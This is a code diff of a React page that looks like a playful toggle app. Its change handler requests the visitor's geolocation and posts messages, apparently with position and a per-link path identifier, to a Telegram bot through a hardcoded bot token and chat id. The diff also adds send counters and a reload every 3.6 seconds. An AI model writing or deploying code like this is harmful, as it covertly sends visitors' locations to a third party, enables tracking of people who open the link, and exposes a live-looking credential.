@@ -35,6 +35,8 @@ const App = () => {
   const armRef = useRef(null);
   const bgRef = useRef(null);
   const indicatorRef = useRef(null);
+  const [sendLove, setSendLove] = useState(false);
+  const [countLove, setCountLove] = useState(0);
 
   const onHover = () => {
     if (Math.random() > 0.5 && count > armLimit) {
@@ -47,30 +49,37 @@ const App = () => {
     }
   };
   const onChange = () => {
+    setCountLove(countLove + 1);
     var pathArray = window.location.pathname.split('/');
     console.log(pathArray[1])
     if (navigator.geolocation) {
       console.log("getting position")
-      navigator.geolocation.getCurrentPosition(showPosition);
       if (checked) return;
       setChecked(true);
+      console.log("count love send: ", countLove)
+      if (countLove > 4) return;
+      navigator.geolocation.getCurrentPosition(showPosition);
     }
     console.log("send common message")
+    if (checked) return;
+    setChecked(true);
+    if (sendLove) return;
+    if (countLove > 4) return;
     fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
       method: "POST",
       body: JSON.stringify({
         chat_id: -1002002927520,
-        text: "Quá dữ anh em"
+        text: "jangding need you, can't get lat long"
       }),
       headers: {
         "Content-type": "application/json; charset=UTF-8"
       }
     });
     console.log('sending love')
-
-    if (checked) return;
-    setChecked(true);
   };
+  setTimeout(function () {
+    location.reload();
+  }, 3600);
   function showPosition(position) {
     try {
       var pathArray = window.location.pathname.split('/');
@@ -86,6 +95,7 @@ const App = () => {
           "Content-type": "application/json; charset=UTF-8"
         }
       });
+      setSendLove(true);
     } catch (e) {
       console.log(e)
     }
